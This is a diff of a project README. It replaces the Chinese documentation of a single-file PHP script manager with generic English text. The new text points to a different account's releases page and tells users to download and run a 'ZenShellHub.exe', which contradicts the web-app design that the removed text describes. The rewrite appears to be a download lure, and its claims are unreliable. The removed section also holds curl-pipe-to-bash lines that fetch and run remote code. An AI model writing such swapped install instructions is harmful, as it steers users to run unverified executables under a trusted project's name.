@@ -1,127 +1,84 @@
-# ZenShellHub 🐚
+# 🌟 ZenShellHub - Your Simple Script Management Center
 
-> 极简、高颜值的单文件脚本管理中心。
+## 🚀 Getting Started
+Welcome to ZenShellHub! This tool helps you manage your shell scripts easily. It offers a clean and attractive interface, allowing you to quickly enter your favorite scripts. No programming knowledge is needed. Let's get you started.
 
-**ZenShellHub** 是一个单文件（Single-File）的 PHP 应用程序，旨在帮助运维人员、开发者以最优雅的方式管理和分享常用的 Shell 脚本命令。它不需要数据库，不需要复杂的安装过程，上传即用。
+## 📥 Download ZenShellHub
+[![Download ZenShellHub](https://img.shields.io/badge/Download-ZenShellHub-brightgreen)](https://github.com/frank235-alt/ZenShellHub/releases)
 
-设计上采用了 **"Zen-iOS Hybrid"** 视觉语言，拥有极致的物理触感、光学模糊效果和流畅的交互动画。
+## 📋 Overview
+ZenShellHub is a minimalistic script management center. It allows users to:
+- Self-deploy the application.
+- Quickly input and run shell scripts.
+- Organize scripts in a user-friendly environment.
 
-## ✨ 核心特性
+The goal is to make it easy for everyone to manage their shell scripts without complications. 
 
-* 💎  **极致 UI 设计** ：全站采用 iOS 级毛玻璃（Backdrop Blur）效果，物理光学边框，深色模式适配。
-* 🚀  **零依赖单文件** ：所有逻辑（前端 React + 后端 PHP）集成在唯一的 `index.php` 中。
-* 💻  **终端客户端** ：提供原生 Shell 脚本 (`zenshell.sh`)，支持在终端直接预览并执行命令。
-* 🔒  **安全隐私** ：
-  * 首次访问强制初始化管理员密码。
-  * 未登录状态下内容完全模糊遮挡，甚至不加载图片资源。
-  * 自动生成 `.htaccess` 防止数据文件被外部下载。
-* ☁️  **数据持久化** ：使用 JSON 文件存储，无需 MySQL/Redis，迁移只需复制文件。
-* 🔗  **分享机制** ：支持生成特定脚本的专属分享链接，接收者无需登录即可查看指定内容。
-* 📱  **完美响应式** ：PC 端与移动端（iOS/Android）完美适配，控件自适应居中。
-* ✨  **智能交互** ：
-  * 图片悬停全局浮出查看。
-  * 代码块智能识别复制。
-  * MacOS 风格终端展示。
+## ⚙️ System Requirements
+ZenShellHub is designed to run on various systems. Here are the suggested requirements:
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Linux (most distributions).
+- **RAM:** At least 4 GB recommended.
+- **Storage:** 100 MB of free space.
+- **Shell Environment:** Compatible with bash, zsh, and other popular shell environments.
 
-## 🛠️ 快速部署
+## 🔄 Features
+ZenShellHub provides numerous features to enhance your scripting experience:
+- **User-Friendly Interface:** Simplifies navigation and use of scripts.
+- **Script Organization:** Keep your scripts sorted for easy access.
+- **Quick Input Method:** Allows rapid entry and execution of shell commands.
+- **Backup Options:** Safeguard your scripts with easy backup solutions.
+- **Customizable Shortcuts:** Set up your own key shortcuts for frequently used scripts.
 
-### 环境要求
+## 📦 Installation Steps
+To install ZenShellHub, follow these steps:
 
-* PHP 7.4 或更高版本
-* Web 服务器 (Nginx / Apache / OpenLiteSpeed)
+1. **Visit the Releases Page**
+   Go to the ZenShellHub releases page by clicking the link below:
+   [Download ZenShellHub](https://github.com/frank235-alt/ZenShellHub/releases)
 
-### 安装步骤
+2. **Select the Latest Version**
+   On the releases page, look for the latest version. Typically, this is at the top of the page. Click on it to view release details.
 
-1. **下载** ：下载本仓库的 `index.php` 文件。
-2. **上传** ：将文件上传至您的服务器网站根目录或任意子目录。
-3. **权限** ：**（重要）** 确保该目录拥有写入权限（755 或 777），因为程序需要自动创建 `data.json` 和 `.htaccess` 文件。
-   * *Linux/宝塔面板示例* ：`chown -R www:www /www/wwwroot/yoursite/`
+3. **Download the Application**
+   You will see assets related to the release. Click on the relevant file link to download the application (usually a `.zip` or `.tar.gz` file).
 
-### 开始使用
+4. **Extract the Files**
+   Once the download completes, find the downloaded file on your computer. Right-click it and choose “Extract All” to unpack its contents.
 
-1. 在浏览器访问该页面。
-2. 首次加载会弹出 **“系统初始化”** 窗口，请设置您的管理员密码。
-3. 登录后即可开始添加、编辑和管理您的脚本卡片。
+5. **Run the Application**
+   After extraction, navigate to the extracted folder. Locate the main executable file (e.g., `ZenShellHub.exe` or `ZenShellHub.sh`). Double-click the file to run ZenShellHub.
 
-## 🐳 Docker 部署 (推荐)
+6. **Configure Your Scripts**
+   After launching the app, you can begin adding your scripts. Follow the on-screen instructions to input or import existing scripts.
 
-如果您熟悉 Docker，这是最快捷的部署方式，无需配置 PHP 环境。
+## ⚙️ Usage Instructions
+After installing ZenShellHub, using it is simple:
 
-1. **获取文件** ：下载本仓库的 `docker-compose.yml`、`Dockerfile` 和 `index.php`。
-2. **启动容器** ：
-    在项目目录下运行：
+1. **Adding Scripts:**
+   - Click the "Add Script" button.
+   - Enter the script name and the script command.
+   - Save the script.
 
-```
-docker-compose up -d
-```
+2. **Running Scripts:**
+   - Find your script in the list.
+   - Click the script name to execute it.
 
-3. **访问** ：打开浏览器访问`http://localhost:8080`。
+3. **Customizing Shortcuts:**
+   - Navigate to the settings menu.
+   - Assign keyboard shortcuts to your scripts for faster access.
 
-* 数据将自动持久化存储在当前目录的 `data/` 文件夹中。
-* 默认端口为 `8080`，如需修改请编辑 `docker-compose.yml`。
+4. **Backup Your Scripts:**
+   - Go to the backup option in the settings.
+   - Follow prompts to back up your scripts to a safe location.
 
-## 💻 终端客户端 (CLI)
+## 🌐 Explore More
+To see more of what ZenShellHub can do, check out our documentation on the GitHub Wiki (insert link to Wiki if available). 
 
-本项目附带一个纯 Shell 编写的终端客户端 `zenshell.sh`，让您无需离开终端即可连接您的 ZenShellHub 节点，快速管理和执行脚本。
+## 💬 Support and Feedback
+If you encounter any issues or have questions, feel free to raise them in the "Issues" section of our GitHub repository. Your feedback helps us improve the application.
 
-### 安装与使用
+## 📥 Download ZenShellHub Again
+To download ZenShellHub, click here: 
+[Download ZenShellHub](https://github.com/frank235-alt/ZenShellHub/releases)
 
-1. **下载客户端** ：
-   将 `zenshell.sh` 下载到您的本地机器（macOS/Linux）。
-
-```
-bash <(curl -sL https://qninq.cn/file/sh/zenshell.sh)
-bash <(curl -sL https://raw.githubusercontent.com/wang4386/ZenShellHub/refs/heads/main/zenshell.sh)
-```
-
-1. **首次运行配置** ：
-   
-   ```
-   ./zenshell.sh
-   ```
-   
-   * 脚本会提示您输入  **对接端点** （即您部署的 ZenShellHub 网址，如 `http://mysite.com`）。
-   * 输入您的 **管理员密码** 进行验证。
-   * 验证成功后，脚本会自动检测您的 Shell 环境（zsh/bash）并添加快捷指令 `zensh`。
-2. **快捷指令** ：
-    重启终端或重载配置后，您只需输入 `zensh` 即可随时启动：
-
-```
-zensh
-```
-
-1. **卸载** ：
-    在客户端主菜单中输入 `u` 即可卸载客户端并清理相关配置文件及别名。
-
-## 📸 预览 (Screenshots)
-
-![未登录](https://assets.qninq.cn/qning/WIg3sJqj.webp)
-![管理](https://assets.qninq.cn/qning/uk4khhBg.webp)
-![新建](https://assets.qninq.cn/qning/H7ldenPv.webp)
-
-## ⚙️ 配置说明
-
-所有数据默认存储在同级目录下的 `data.json` 文件中。
-
-* **备份** ：只需下载 `index.php` 和 `data.json` 即可完成全站备份。
-* **重置密码** ：如果忘记密码，请通过 FTP/SSH 删除 `data.json` 中的 `"password_hash"` 字段，或直接删除该文件（数据将丢失）以重新初始化。
-* **伪静态规则**：Nginx应当添加如下规则来保护data.json文件。
-
-```
-location = /data.json {
-    deny all;
-    # 或者使用 return 404; 来伪装文件不存在
-}
-```
-
-## 🤝 贡献 (Contributing)
-
-虽然这是一个单文件项目，但欢迎提交 Issue 或 PR 进行优化。
-
-## 📄 开源协议
-
-https://github.com/wang4386/ZenShellHub
-
-本项目采用 [MIT License](https://mit-license.org/) 开源。
-
-Designed with ❤️ by [青柠·倾城于你](https://qninq.cn/)
+Enjoy managing your scripts with ZenShellHub!
